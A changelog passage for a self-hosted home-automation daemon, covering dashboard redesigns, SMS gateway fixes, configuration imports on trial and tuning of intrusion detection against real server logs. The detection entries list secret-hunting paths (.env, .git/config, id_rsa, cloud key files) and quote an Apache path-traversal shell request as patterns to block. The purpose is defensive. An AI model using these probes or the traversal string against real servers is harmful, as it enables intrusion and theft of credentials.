  CPU, a repaint in Settings cost 70-890 ms, growing with every section
  opened; now 45-80 ms, the drawing itself 4-12 ms. What it was:
  - six attribute searches over the whole page (30,000 elements once every
    section had been opened) on every drawing pass, to find six dropdowns;
  - every column header on every tab measured on every repaint, twice;
  - a socket's age in seconds - different every time, shown nowhere - in
    the signatures, so every card showing sockets was rebuilt on every
    status;
  - the lock bar and the header cards rewritten every second whether they
    changed or not, and the lock button given a new pair of listeners every
    second (an hour in, one hover ran the help panel three thousand times);
  - All values building all sixty-five cards for every report - now only the
    card whose device reported;
  - the daemon's health asked for on every change while any section of
    Settings was open, drawn where nobody could see it.

**iPad.** On an iPad the page came out taller than the window (100vh there
is the screen with Safari's bars put away), so Safari scrolled the whole
page - header, tabs, the Editing bar - up out of sight; the visible height
is used now and the page is held still. And a finger has no hover: a tap
opened the Settings menu and nothing ever shut it. Now picking a section
shuts it, and so does a tap anywhere else; the pin still keeps it open.

4.70.0 — detection taught by five days of the front server's own logs; a
rolled-back import goes on trial again without its file.

**What the logs showed.** 10,435 lines from nginx (both servers, access, full
and error logs) and Suricata, 15-20 September, 536 addresses. Each address
was labelled by hand-written rules that know nothing of the daemon's weights
(attack / looking around / the house's own), then every line was replayed
through the detection in the order it happened, with its own time. Before:
109 of 125 attacking addresses kept out. Now: 112 (113 with the notification
server's access log read too). Nothing of the house's own is newly kept out,
and nothing that was kept out before is let through now.

* **Known by name.** The paths the scanners here actually asked for and no
  rule knew: phpinfo in thirty spellings, cloud keys (service-account.json,
  gcp-key.json, firebase-*.json, client_secrets.json), every .env by another
  name (secrets.env, sendgrid.env, .env~), docker-compose.yml,
  appsettings.json, wp-config.php.bak, .git-credentials, litellm's
  config.yaml, server.key; and the ways in - PHP-CGI (allow_url_include),
  PHPUnit wherever it is put, SAP NetWeaver, Cisco ASA, SGLang, the Docker
  API, Bitbucket, cameras, Joomla, WordPress logins, ThinkPHP kits, nmap, and
  one scanner's round of /sdk, /evox/about and /asofKlj from sixteen
  addresses. None of the house's own paths match (the one-tap road, the
  notification server's app and API, /.well-known).
* **The notification server's side** is weighed for the same paths, from
  its full log (which is what is read here) or its access log when that is
  the one read - never both for one request.
* **A burst is not a retry.** Five requests for /.git/config in one second
  were folded into one as a browser retrying; no browser asks for that, so
  the unmistakable kinds are no longer folded.
* **Remembered for the day.** One of those, alone, is still not a block. But
  a second later the same day is - it was an hour or a day apart, never twice
  in ten minutes, and never kept out. The block says it counted the earlier
  one.
* **Every log line counts when it happened.** The error log's lines and the
  lines that are not HTTP at all were counted at the moment they were read,
  so an hour of failed handshakes read at once looked like a flood. Climbing
  out of the web root is recognised before the 444 it is answered with.

**On trial again.** A rollback now keeps what it took out with the record,
and the history shows *On trial again* beside it: the same items, the same
ids, back on trial through the same checks as a new file (refused in the same
words if any of it would now take the place of something in force). Little
scripts are now kept under "Going back a step" too, which is where a rollback
from before this version is found again.

4.69.0 — Control is now Settings, and All values is its last section.

**Settings.** The Control tab is called Settings; its addresses stay
#control/... so bookmarks and links keep working. Every help text that
pointed at "Control → ..." now names the Settings section it means
(Settings → Devices, → Zigbee, → Backup, → Alerts → Messages and so on).

**All values** is no longer a tab of its own but the last item of the
Settings menu (System → All values). It draws the same cards with the same
values; the old #all address, a device's "Every value it reports" link and
Ctrl+K all land there.

**No PIN box where no PIN is needed.** With the view lock on, opening any
part of Control asked for the database backup list, which is behind the
lock, and threw the PIN box up even over sections that need none. The list
is now asked for only in Data & database, where it is shown. A field left
focused in a section that was switched away from, or in the PIN box once it
closed, no longer counts as somebody typing (that held every repaint of the
next section back).

**Menu pin** sits on the left of the Settings menu.

4.68.1 — one search everywhere, landing on the thing itself; quiet
scrollbars; no two buttons on top of each other.

**Search.** Ctrl+K, "/" and the box in the header are now one search over one
list: every tab, every card on every tab, every Control section, card and
setting, and every device, socket, room, scene, sequence, rule, button
binding, alert message, person and one-tap link. Confirming a hit goes there
and puts the focus on it: the setting's own box, the editor row of that scene,
rule, binding, message, person or link (opening its folded section first), the
device's row on Devices, the room's card on Heating, a section's heading. It
glows for a moment and is scrolled into view. Before, Ctrl+K reached a rule's
or a scene's section but not the rule or scene, a socket only its tab, and it
knew nothing of settings, cards, alerts, people or links.

**Scrollbars** are thin and in the page's own greys; the closed menu has none
(it still scrolls under the wheel).

**Buttons.** Measured on every tab and Control section at 1920, 1440 and
390 px: rows of buttons met or overlapped in three places - Backup and
Recorded data, where the paragraph that used to part two rows is now under
About, and between one little script and the next. None does now.

Proven in a real browser: thirteen kinds of thing found by Ctrl+K and by the
header box, each ending with the focus on it and on screen; no overlapping or
touching controls anywhere at three widths. The page walk finds nothing new.

4.68.0 — the whole application in the style of Control. The tabs across
the top stay where they were.

**Every tab is an application on a desk.** The browser's page never scrolls:
the header and the tabs stay put, the tab below them fills the rest of the
screen and scrolls in its own frame, across the whole width of the monitor.
Each tab keeps its own place - leave History half way down, look at Plugs,
come back and it is where it was. A picker or a list of suggestions closes
when its frame scrolls. On a phone every tab scrolls as a page, as before.

**One kind of card everywhere.** A card's title is a title - plain words, not
small grey capitals - and its long explanation is folded to its first
sentence with the rest under About, on every tab, including cards drawn
afresh as the house reports. The notes the page writes into as it goes are
left as they are.

**Find anything.** A box in the header (or "/" from anywhere that is not a box
being typed in) finds a tab, any card on any tab, a Control section, card or
setting, a device or a socket, and goes there - to the setting itself, the
card itself, or a device's history. Arrows and Enter work.

**Phones.** Three tabs were wider than the screen: Overview 439 px (the energy
table), Heating 401 px (the rooms) and Public API 803 px (the ban history). A
table now scrolls in its own place and the rooms are one column: every tab is
390 px on a 390 px phone.

Proven against the page as it was before this change, in a real browser on the
house's own database: all twelve tabs draw the same number of fields, buttons,
table rows and cards; no element id is lost; at 1440×900 no tab lets the page
scroll and each reaches the bottom of the window; every tab is 390 px wide on
a phone; the search finds a setting, a device, a card and a section and lands
on each. The page walk finds nothing the old page did not.

4.67.2 — Control on a desk is an application: the window never scrolls.

The header, the tabs, the Editing bar and the menu stay where they are; the
section on the right fills the rest of the screen and is the only thing that
scrolls, and Control uses the whole width of the monitor. The menu scrolls on
its own inside the same frame, opens under the pointer and pins as before. A
new section starts at its top. A picker or a list of suggestions, which hangs
on the page rather than in the frame, closes when the frame scrolls instead of
being left over the wrong box. The other tabs, and every tab on a phone,
scroll as they always did.

Proven in a real browser at 1100×700, 1440×900 and 1920×1080: the page
cannot scroll at all, the header stays at the top, the right side reaches the
bottom of the window and scrolls (1392 px), the wheel over the menu scrolls
the menu and nothing else, pinning still moves the section over, History
still scrolls as a page, and a phone still scrolls normally. The page walk
finds nothing new.

4.67.1 — the Control menu hides itself, scrolls on its own and can be
pinned; and every on/off switch is the same shape.

**The menu on the left** is a rail of icons at the edge of the window, so the
sections take the whole width. It slides open under the pointer (or on
keyboard focus) and closes again when the pointer leaves; the pin at its top
keeps it open, and then the page moves over to make room. The choice is
remembered in this browser. It is fixed to the window and scrolls by itself:
scrolling the page no longer carries it off the top (it was sticky only to
the end of its column), and the wheel over it no longer scrolls the page. On a
phone it is the strip across the top, as before.

**Switches.** Measured on every tab and every Control section, at desktop and
phone width: 151 switches, now all 44×26 (or the small 36×22). Eight on
the SMS gateway card were 44×33 - stretched upright, in 4.66 as well - because
the rule that makes that card's labels two lines tall also caught the
switches, which are labels too. Two more rules like it now leave switches alone.

Proven in a real browser at 1100, 1440 and 1920 px: shut by default and not
covering the page; open on hover and shut on leaving; the page scrolled 1406 px
with the rail staying put; the wheel on the rail scrolling the rail and not
the page; pinned, the page moved clear of it, and still pinned after a reload.
The page walk finds nothing new.

4.67.0 — Control, rebuilt to be found your way around: twenty sections
in six groups, settings beside what they set, a short line on the page and
the whole story one press away. Nothing that works was changed.

**Sections.** A sidebar (a strip across the top on a phone) with Devices
(Devices, Zigbee, Health, Polling), Automation (Rules, Scenes & time, Buttons
& groups, Rooms & heating, Scripts), People (Presence), Messages (Alerts, SMS
gateway, One-tap links), Security (Blocking, Front server & router, Access)
and System (Energy & charts, Backup, Data & database, Diagnostics). Each
section opens with its name and one line saying what it is for. The old
addresses (#control/system and the rest) and every link from another tab
still land in the right place.

**Settings where they belong.** The one card of eighteen groups is gone: each
group sits beside the cards it belongs to - the battery and quiet-device
limits under Health, the blocking under Blocking, the router under Front
server & router, the backup times under Backup. Every Save on a settings card
saves all of them, exactly as the one Save did. A card holding a single group
takes the group's name.

**Short on the page, whole on demand.** Labels are plain sentence-case words.
Each setting has an ⓘ: what it does, what is running now, and the three
places a value can come from - the built-in default, config.json, this
dashboard - drawn in the order they are weighed, the one in force marked.
The daemon now says which of the three it is (`source`, `default`,
`in_file` in runtime_config), so the page no longer calls a built-in default
"what config.json says". Each card shows its first sentence; About opens the
rest. The Editing bar is one line.

**Find.** A box at the top of the sidebar finds any section, card or setting
by name, key or description, opens its section and points at it.

**On a phone** no section is wider than the screen any more (the old System
section was 1049 px on a 390 px phone): tables scroll in their own place, SMS
command rows fold onto two lines, a long chip is cut.

**Lighter.** Each editor is drawn when its own card is on screen, not when
anything from its old section is - opening SMS no longer builds the rules,
scenes and links behind it.

Proven, old page against new on the house's own database in a real browser:
Save sends the same 133 settings with the same values, untouched and after
changes in four sections; the 44 boxes that a choice elsewhere shows or hides
follow the same five choices the same way; all 36 cards hold the same fields,
buttons and rows; no element id is lost; every section fits a 390 px phone.
The page walk (test/render.js, pointed at the new places) finds nothing the
old page did not, and four fewer; its SIM check now waits for the house to
answer instead of a fixed second and a half. Every Python test passes.

4.66.1 — imports on trial, checked against what was asked for, point by
point; two things put right.

* **What is on trial is left out of backups and exports.** It went into them
  as ordinary items, so a server restored from the nightly backup would have
  brought a rule or an SMS command back acting for real without anybody ever
  committing it. A backup is now what is in force; what is on trial joins it
  when it is committed. (A backup of the whole database keeps the trial
  records with it, so there it comes back still on trial.)
* **Little scripts and sequences can go on trial too.** An SMS command that
  runs a script could not be brought in with its script. A script or
  sequence on trial runs only when something on trial asks for it - and that
  only writes down what it would have done.

* **An export waits for the last lines of the ban history** still on their way
  to the disk, so one taken the moment after a block is complete.

Proven by a guard in test/taps.py (a rule and a script on trial are not in
the export; the script goes on trial and is taken out again by a roll back),
failing on 4.66.0.

4.66.0 — imports on trial: new configuration from a file, added without
touching what runs, tried out, then committed or rolled back.

For files written somewhere else - alert messages worth having, SMS commands,
rules for the sensors - and for any part of one. Settings → Backup:
**Import on trial…** and **Imports on trial**.

**Safety, first of all.** An import on trial only ever *adds*. Before anything
is written the file is held against what is in force, and anything that would
take the place of it refuses the whole file: the same id, the same name (an
alert message, a scene, a sensor or action group), an SMS phrase the running
commands would answer or that would answer theirs ("lights off now" against
"lights off"). Then every section is saved through the same checks the
editors use; one section refusing puts every section back as it was.

**While on trial nothing it adds acts.** Rules (on a reading, held for a
time, at a window's end), schedules and presence triggers are weighed for
real and write down what they *would* have done - in Events, and on the
import's own card. An SMS command on trial answers only a number allowed to
give commands (whatever it says about strangers), does nothing, and texts
back "[TEST] ... would: ...". Alert messages can be let through while on
trial, marked [TEST], by ntfy and Telegram only - never by SMS - with a switch
per import. Which items are on trial is kept by id in the import's record, not
as a mark on the item, so an editor saving a list back cannot drop the mark
and let a trial item act. The editors show them: a purple edge and a TEST tag
on rules and SMS commands.

**A newer file may replace an older one still on trial** (the next version of
the same file); rolling the newer one back puts the older version back.
Nothing committed can be replaced this way.

**Commit** (two presses) and it is ordinary configuration. **Roll back** (two
presses) and exactly what it added is gone. **History**: committed and rolled
back imports, removed ticked ones at a time or all at once (two presses); one
still on trial cannot be removed. A whole settings import closes anything on
trial, and says so.

The file is JSON with any of these lists, in the same shape as a settings
export: `messages`, `sms_commands`, `rules`, `scenes`, `schedules`,
`presence_triggers`, `sensor_groups`, `action_groups`. An item may carry its
own `id`; a rule can point at a message the same file adds with
`"plug": "notify:<its id>"`. The preview names everything, and warns before it
is ever committed: a target of every plug, a command that would answer any
number, one that keeps addresses out, a sensor this house does not have.

Proven: a guard in test/taps.py (a trial rule and SMS command act on nothing
and write down what they would have done; four kinds of file that would change
what is in force refused, none of them leaving anything behind; a newer trial
replacing and giving back an older one; commit acting for real; history kept
from being cleared while on trial), the same on a copy of the house's own
database, and the page driven through all of it in a headless browser.

4.65.0 — a server lost and rebuilt: what the settings export brings back,
and what a restored database puts in force.

Checked the way it would happen: the house's own database of 18 September as
the old server, with a configuration file that keeps the router in it; an
export taken from it; a clean install on a new database; the export put back;
everything held against the old server, table by table and key by key.

**What the export did not bring back, and now does:**

* **The list of addresses kept out, and all of its history** - every line on
  the list, the history of each (kept out, let back in, folded), what was
  said about each one (why, for how long, the lines it was judged on, what
  Suricata said), the folds and what each subnet was folded from. Before, a
  rebuilt server came up with the list empty. Put back *added to* what is
  there: nothing kept out since is let in, a line already there is not written
  twice, an address whose time ran out while the server was gone is not kept
  out again. The router is told once it is back.
* **What the configuration file said.** On a house set up by hand the router
  (host, user, list, sync), the notification servers and more live only in
  /etc/zigmon/config.json, which the export never carried - so a rebuilt
  server had no router at all. Now it travels under "config_file" (passwords
  only in the export with secrets). Everything Settings can hold is put in
  force on import; the rest - the broker, the PIN, anything that belongs to
  the new machine - is named in the import report, to copy across by hand.
  Where the files live and the API port stay out: they belong to the machine.
* **The SMS commands** (never in the export).
* **The Zigbee gateways** (in the export, but never read back on import).
* **The password the plugs use for the broker** (with secrets), and the
  order of the Wi-Fi list.
* **Names given by hand** to devices: on a rebuilt server no device is known
  yet, so every one was dropped. Now each waits and is put on the device the
  moment it turns up.

**A database put back from a backup** (Settings → database backups) now has
its settings in force at once - before, a clean install restored from its
backup ran on with the blacklists off and the SMS gateway off until it was
restarted - and the router is told about the list that came back.

Proven: the rebuild above ends with nothing missing (86 kept out, 194 lines of
history, 54 ended, the fold and its 14 subnets with their members, 34
settings, 8 SMS commands, 3 gateways, the router set up and in step at 86 of
86, the names back once their devices turned up); the same export put back
through the page on a brand-new daemon; and two new guards in test/taps.py,
both failing on 4.64.3.

4.64.3 — the fold history: a Remove on each fold, and one button that
clears the whole history.

Each earlier fold has its own **Remove** (it was "Remove from history", which
read as if it cleared everything - it never did; with a single fold in the
list the two looked the same). Under the list, once there are two or more,
**Clear the whole history (N)** takes every record out at once. Both need two
presses and the PIN, and both take out only the undo records: the subnets stay
kept out and keep what they were folded from. Refused while a fold, an undo or
a check is running. Written to the events.

Proven by test/taps.py (three records, the middle one removed, the other two
stay; "all" empties it; a second "all" is refused; the subnet still kept out)
and by the page driven in a headless browser with three folds: Remove on one
leaves two, Clear the whole history leaves none, every button has an icon.

4.64.2 — the fold sheet: an icon on every button, and one fold at a time
can be taken out of the undo history.

**Icons on every button of the fold sheet.** The widths (/24, /20, /16), Fold,
Leave them as they are, Undo this fold, Check the router now, Try the router
again and Close each carry an icon, as the rest of the page does. Three new
ones: undo, a range of addresses, and the router read back.

**Remove from history**, on each earlier fold. Two presses (the first turns it
red and asks again for four seconds), then the PIN as for everything else here.
Only the undo record goes: nothing on the list or the router changes, the
subnets stay kept out, each still shows the addresses it was folded from, and
taking one of those subnets off still puts its addresses back. Refused while a
fold, an undo or a check is running, since that one may be working on the very
record. Written to the events as who removed which fold.

Proven by a new guard in test/taps.py (refused while a fold holds the lock;
removed, the subnet stays kept out, keeps its two members and still unfolds;
a second removal is refused) and by the page driven in a headless browser:
every button in the sheet has an icon, and two presses empty the history.

4.64.1 — a pass over the whole house for bugs, lags and latency, and over the
page for anything that vanished from under the hand.

**Nothing on the page is taken away while you are using it any more — and the
data keeps arriving.** A walk through every tab, typing in every box, opening
every disclosure and selecting text, with live updates forced after each:

- **the filter boxes on the blocked page lost the cursor on every update**,
  two letters in — both the list filter and the history search. The list is
  still drawn afresh from what arrives; where the cursor was is put back on
  the new box straight after.
- **an opened "folded from" closed again** at the next update. Remembered
  now until you close it.
- **text selected in Events was taken away** when the list reloaded. It waits
  while something is selected, like every other list, and is drawn the moment
  you let go.
- the editing countdown pauses while it is selected.

**Two folds at once lost what subnets were folded from.** A double click, or
two tabs: each wrote the list of what a subnet holds, the second over the
first, and up to ten of fourteen subnets forgot their addresses — nothing was
let in, but their stories were gone and undoing put back nothing. One fold at
a time now; a second press shows the one already running. And a subnet that
was on the list only for a while is made to last when addresses are folded
into it (they would have been let in when it ran out), and gets its own end
back if that fold is undone.

**The row counts for the Control tab held the whole database for a fifth of a
second, every thirty seconds.** Two million readings, counted under the lock
everything else writes through. Counted on a read-only connection of their
own now; anything needing the lock meanwhile waited 156 ms and now waits none.

**An SMS "home" kept you home after the Wi-Fi had watched you leave.** It is
there for the minutes before the phone joins the Wi-Fi — the geofence fires
early, the lift takes its time — and it still does that, for up to half an
hour. But once the Wi-Fi has seen the phone, the SMS has done its work, and
from then on the Wi-Fi decides. Before, SMS home, ten minutes in the flat, out
again: still home until the SMS aged out.

    SMS at 1, on the Wi-Fi at 5, off it at 10, grace 10 min
    4.64.0   away at 35
    4.64.1   away at 21

**Outlook asking for its settings is not an attack.** `autodiscover.xml` is
what an ordinary Outlook asks for when a mailbox lives on this domain; 4.62.0
read it as an Exchange break-in, and two of them would have kept the owner's
phone out. Only the ProxyShell form of it counts now. Nothing in the logs
asked for it either way.

Measured and left alone: no thread builds up (ten, steady, through the timer
loop and a page polling); the hourly roll-up holds the lock for a quarter of a
second once an hour, and the page did not notice it. The blocked-list timing
guard now takes the best of three rounds rather than one average — it failed
on released builds here too, on a busy machine, rather than on a slow list.

4.64.0 — **folding is watched from start to finish, checked against the
router, and every fold can be undone.**

Confirming a fold opens a window that follows it through three steps:

    ✅ Folding here              38 address(es) into 14 subnet(s) — 86 line(s) instead of 110
    ✅ Telling the router        14 added, 38 taken off        [progress bar, 0 … 52 of 52]
    ✅ Reading the router back   in step: 86 line(s) here, 86 of ours on the router

The router is told one line at a time, and the bar counts them. Then it is
**read back** and held against the list here: anything kept out here that the
router does not carry, and anything of ours the router still carries that is
no longer kept out here. A busy router sometimes drops a line without a word,
so a mismatch is told once more straight away and read again; only a line
that is still missing after that is a failure, and it is named. Entries
somebody else put on the router are counted and left alone.

**Undo.** The last folds are kept — 10 unless you choose otherwise in Settings
→ *The router that carries the list* — each with an *Undo this fold* button,
in the fold window and straight after a fold. Undo is of **that fold, not a
return to that moment**: its subnets come off, the addresses in them go back
as lines of their own with their own reasons and ends, and anything kept out
since — a scanner that arrived an hour later — stays kept out. The undo is
told to the router and read back in the same way.

*Check the router now*, in the same window, does only the last two steps:
reads the router, puts right anything out of step, reads it again.

Tried against a pretend router that holds its list and answers each command
after a pause: fold and undo both end in step; a router that loses a subnet
once is put right on the second telling; one that keeps losing it is reported
with the subnet named, and the addresses are still refused by this machine.

4.63.0 — **Fold into subnets**, a button beside *Read the router now*.

The list fills with addresses from the same few streets: five from
`213.209.159.x`, four from `45.148.10.x`, each a line of its own on the router.
Where an enabled list already names the **whole** subnet, one line for the
subnet does the same work. Where no list names it, the addresses stay one
line each — nobody is kept out because a neighbour was. A list of single
addresses (ipsum, blocklist_de) names no subnet at all, so nothing it holds
is ever widened.

It never runs by itself. Pressed, it shows what it would do — every subnet,
which lists name it whole, and the addresses it would take in with what each
was kept out for — and does nothing until you confirm. It folds only where a
subnet would take in **two or more** addresses (one address turned into a
subnet is the same number of lines, covering more), never across anything
under *Never kept out* (written as a bare address, a CIDR range, a dash range
  like `192.168.1.1-20` or `192.168.1.1 - 192.168.1.20` with or without the
  spaces, or a star for the last part — separated by commas, semicolons or
  spaces; anything else is said in the log rather than left on the list doing
  nothing) or a private range, and no wider than you choose: /24
by default, /20 or /16 if you ask (/64, /56, /48 for IPv6).

On the list as it stood on 18 September:

    110 lines -> 86      38 addresses into 14 subnets
    addresses that were kept out and afterwards were not: 0

**Nothing about the folded addresses is lost.** Each one comes off the list as
"folded into 213.209.159.0/24", not "let back in", and does not count as
another block on the ladder. Its reason, the lines that earned it and what
Suricata said all stay under its own name:

- the subnet's row in *Blacklisted IPs* opens to the addresses it was folded
  from, each with its reason; searching for one of them finds the subnet
- *Read the router now* shows, under the subnet, the whole story of every
  address in it — reason, evidence, Suricata's rule, history
- *Ask about it* for a folded address says which subnet keeps it out, and
  what it was kept out for before that

**Taking a folded subnet off unfolds it**: its addresses go back on the list
exactly as they were — their own reasons, their own start, their own end. Any
whose own time ran out while folded stay off. Pressing the button again
later folds new arrivals into subnets already there.

And one fault found on the way that mattered before this existed: **a range
put on the list by hand never reached the router.** The sync checked for a
single address and passed over anything with a `/` in it, without a word — the
list here said "kept out" and the router let it through. It carries subnets
now, and its comment keeps the `/` (it read `81.200.10.024`).

4.62.2 — you are right, and it was mine: **the modem had not been asked how
it was doing since the webhook went on.** The status reading — signal,
network, data, SIM, and every chart of the modem — rode on the inbox's beat.
Setting *Look for incoming messages* to never, which is right with the
webhook on, stopped both. The card said "silent for 14h29m" and meant it.

It has a beat of its own now: *Read its signal, network and data*, in the
gateway's own card, every 30 seconds unless you choose otherwise. It gives way
to a message going out, as before, and never runs twice at once.

And one thing found on the way that would have been worse than the silence:
**the status reading counted the inbox, every ten minutes.** That is a read of
the inbox nobody asked for — the one thing that wedges that box — and giving
the status its beat back would have brought it straight back. With the
webhook on it is not counted at all now; with looking on it is counted as it
always was.

    webhook on, looking never, six seconds on the real timer
    4.62.1   status 0   inbox 0
    4.62.2   status 6   inbox 0

4.62.1 — **the token that opens this API was written into the log in full,
on every SMS push, whenever debug was on.** The relay sends it as
`X-Zigmon-Token`. The push account hid a header only when its name was
exactly "token", "secret" or "key", and "x-zigmon-token" is none of those, so
it went through whole — it is in the log from 18 September, all 43
characters. Every other debug line shortened it correctly, which is why it
looked handled: the push account kept a list of its own.

It now hides the daemon's token wherever it appears, and matches key-like
names anywhere in the name. The shared header line does the same for a
stranger's `X-Api-Key` or `X-Auth-Token`, and `debug_secrets` still shows
everything whole when it is asked to. The guard sends the token the way the
relay does — the old helper never did, which is why no guard saw it.

That token has been in a log that left the house, so it is worth changing. A
new one is made whenever the file is missing, and the relay reads the file
itself, so nothing else needs editing:

    sudo rm /run/zigmon/api-token && sudo systemctl restart zigmon

4.62.0 — three days of the front server's log and Suricata's, read line by
line, and the gap they show is one thing: **a request nobody makes by
accident was weighed like any other page that is not there.**

4,914 requests reached that server from 266 addresses outside. 1,368 of them
were hunting for keys — `.env` and fifteen spellings of it, `.git/config`,
`id_rsa`, `/actuator/env` — and 132 were published break-ins asked for by
name: Exchange `owa/auth`, a Fortinet VPN login, GeoServer, Solr, Odoo, the
WordPress batch road, `/cgi-bin/%%32%65%%32%65/bin/sh`, which is a request to
run a shell. All of it scored 2 a time as "a path that is not there". Each of
those addresses asked a handful of times, stayed under the bar and was never
kept out.

**Two new things to be, and one is enough to matter.** `proxy-secret-hunt` is
somebody after this machine's keys; `proxy-exploit` is somebody trying a
break-in that worked on somebody else's machine. Both weigh 8, which is
deliberate: two crosses the standing bar and one does not. Nobody who is
really looking asks only once, and one odd request is still not worth
somebody's whole address.

**What was asked for is now read before how the server answered.** Eight tries
at a Fortinet VPN login arrived at a name this machine does not carry, so they
were closed with a 444 and written down as somebody walking addresses. They
were not.

**The second form of the Apache traversal was missed.** `%2e` written with the
per cent sign itself spelled out — `%%32%65` — is the other half of
CVE-2021-41773, and it read as an ordinary 404.

Fed the real log back through, with every line's moment shifted by the same
amount so the spacing is exactly what it was:

    kept out   before 36     after 45      newly caught 9
    lost       none

Every one of the nine had earned it: three days of `.env`, the VPN login, the
shell, Solr, GeoServer, Odoo, the WordPress road. The rest asked exactly once,
which is the design working, not failing.

**Nothing the house itself does matches either pattern** — 278,547 lines of the
dashboard's own requests, none. The only inside matches are `probe-front`
asking for `.env` and `id_rsa` on purpose, from an address that is spared.

Suricata's side needed one repair rather than a rethink: it is working, and 66
of its 99 alerts are reputation-list hits already weighed. But the list of
things to ignore was matched at the *front* of the words, and Suricata writes
"Generic Protocol Command Decode" and "Detection of a Network Scan" — so
neither matched, and those two are a quarter of everything it said. They only
stayed out of the counting because the severity floor drops them; raise that
floor and the engine's own chatter about out-of-window ACKs would have weighed
against whoever sent them. Matched anywhere in the words now. "Misc Attack"
and "Attempted Information Leak" match no entry either way, so the real ones
are untouched.

Guards for all of it, each checked to fail on 4.60.1.

4.61.1 — you were right that something is wrong with the strip, and wrong
about the cause, which is worth saying plainly: **nothing in the switching
changed in the last two days.** I checked it three ways — no plug, scene or
switch function differs anywhere between 4.42.0 and 4.61.0; a four-socket
scene takes the same 172 ms in every one of those builds, idle or with the
page polling; and the requests that reach the box are the same six, with one
confirming read. So the answer to what you asked is no.

But the strip really does misbehave, and it is older than this week. **A
command refused with 429 gave up, and the socket never moved.**

Your own log has the refusals in it. A box counts its limit per second. The
four commands of a scene go out as fast as the box answers — 0, 42, 83,
125 ms — so the fourth is the one refused. It was then retried once, after
0.3 s, still inside that same second, refused again, and the command raised.
Three sockets moved, one did not. That is why it read as a lag rather than a
miss: something clearly happened, just not all of it.

    against a box limiting at 3 a second, five scenes in a row
    4.42.0  [on on on off]   4.60.1  [on on on off]   5 of 5 lost a socket
    4.61.1  [on on on on ]                            0 of 5

The first retry is still quick, because by then the window is often nearly
over and waiting gains nothing; a second one now follows that waits out the
rest of the second. Worst case a refused command lands in 1.25 s instead of
never. **Nothing is slower when the box is willing** — same 172 ms, same six
requests, byte for byte — because this is only the road taken once the box has
already said no.

Two seconds of sleeping on the first refusal was the lag fixed earlier in the
week, and this is not a return to it: that was the *first* wait, this is a
*second* attempt.

4.61.0 — five things found by measuring rather than by reading, four of them
latency and one of them the answer to a question that had been open for days.

**Why "no answer from the gateway" kept happening on the webhook road.** The
sending held a lock. The inbox read, the sweep and the status question held
only a flag beside it — and that flag goes up as a message is *handed over*,
so a question asked a moment earlier was still in flight when the message
went. That box serves one request at a time and takes seconds over each, so
the message queued behind the question, waited out its patience and was
written down as "no answer" while going out perfectly well.

With the webhook on, looking set to never and *Also take messages off the
modem from here* on — which is how this house is set — the sweep's own inbox
read is the one still doing it. Worth knowing: that switch is **on** in the
settings as exported, though the gateway was described as doing its own
deleting. Everything that talks to that box now takes the same lock, so two
requests can never be in the air together:

    4.60.1  /messages/status  by the sweep ─┐ both in the air
            /messages/send    by the reply ─┘ on a box that takes one
    4.61.0  /messages/status  by the sweep
            /messages/send    by the reply   after it, not on top of it

The lock is reentrant, because reading the inbox and then answering what was
found is one thread doing two things in a row — a plain lock would have
deadlocked the polling road on the first message from a number that may not
give commands. The status question and the beat's inbox read give way rather
than wait; the sweep and a poll somebody asked for wait, because they have
something they must do.

**Every chart range longer than a day answered 500.** `parse_while` reads "on
for ten minutes" and refuses anything past a day; `parse_span` reads a chart's
range. The first quietly replaced the second in three places, was mended in
one, and 7d, 30d and 1y went on failing. parse_while's own docstring named the
bug. All three now say parse_span, and a range that is not one is a 400 asking
for a better one rather than a crash.

**The status build spent four fifths of itself counting rows.** Every ask —
twice a second — walked 717,000 country ranges and 90,000 list ranges, holding
the one lock the database has while it walked. Counted once and remembered,
forgotten when a list is replaced.

**A busy proxy stalled the page for a fifth of a second.** Writing what was
read went in as one transaction; a busy hour hands it tens of thousands of
lines. It goes in in thousands now, as the country list already did. And the
month's money asked the database once per socket, twice, on every status —
forty-six turns of the lock for a figure measured in months. One turn now, and
remembered for ten seconds.

    status while the daemon reads a proxy log
    4.60.1  median 6.0 ms   worst 210.5 ms
    4.61.0  median 4.5 ms   worst   6.4 ms   (lock wait: none)

**Reading TLS fingerprints cost the square of what was read.** A popular
fingerprint is worn by thousands of addresses in an hour, and that list was
rebuilt and walked for every line. Twenty thousand lines — an ordinary busy
hour — took eighteen seconds, and every alert behind them waited.

    2,000 lines   139 ms  ->   45 ms
    20,000 lines  18.4 s  ->  292 ms

Detection is unchanged: one tool across many addresses, one address wearing
many faces, and stale entries still not counting toward either bar.

Guards for all five, each checked to fail on 4.60.1 — and the three that could
have been written against a stopwatch are not, because a stopwatch passes on a
quiet machine: the gateway one has another thread try the lock while the box
is being spoken to, and the counting one counts what reaches SQLite.

4.60.1 — checked, and no: the polling road is intact. Fair question to ask,
because 4.60.0 was all about not touching that box and the way to get that
wrong is to stop touching it when it *is* needed.

    webhook off, four commands in a row
    read      5 polls, 5 readings of the inbox
    acted on  Status, Status, Help, Temp - in order, none lost
    deleted   all four off the modem
    startup   a message already sitting there is still left alone

The ten-minute limit on counting what the modem holds applies either way,
which is right: that count is a number on a card, and the polling road reads
the inbox properly on its own beat regardless.

`test/endpoints.py` now holds both roads side by side - the webhook one
refusing to touch the box on a beat, the polling one insisting that it does.
Those two checks constrain each other, which is what I wanted after changing
this five times in a day.

4.60.0 — **that is the finding of the whole week and it is yours.** 4.59.0
read the modem's inbox *never* - webhook on, looking set to never, the sweep
behind a timer that never started - and in that build the sending **never
stalled once**. Everything worked except the deleting.

So reading that box's inbox is what wedges it. Not the urcd fight, not the
spacing, not our patience: the reading. And my 4.59.1 "fix", which gave the
sweep a beat of its own, would have handed you the stalls straight back.

Two places were doing it on a clock, and both have stopped:

**The sweep.** Gone entirely. The inbox is read only where a webhook has its
own message to take off, on that webhook's thread - and once more twenty
seconds later if the box had not stored it yet, because it forwards before it
stores.

**The status reading**, which counted what the modem was holding **six times a
minute**, all day, purely to put a number on a card. Once every ten minutes
now.

    twelve polls + twelve status readings   the inbox read 0 times
    a webhook with a message to remove      read, and the message gone

`test/endpoints.py` runs both loops twenty-four times and refuses a release
where the inbox is read even once without a webhook asking.

If it stalls again after this, the cause is somewhere I have not looked - but
the one thing we now know for certain is worth keeping: **do not read that
box's inbox unless there is a message to take off it.**

4.59.1 — no, it did not, and you found the exact combination: **webhook on,
looking set to never.**

The once-a-minute sweep - the one that takes off anything a webhook failed to
delete - lived behind *how often to look for incoming messages*. With that at
`never` the timer never started the SMS thread at all, so the sweep never ran
and *Also take messages off the modem from here* quietly did half its job: the
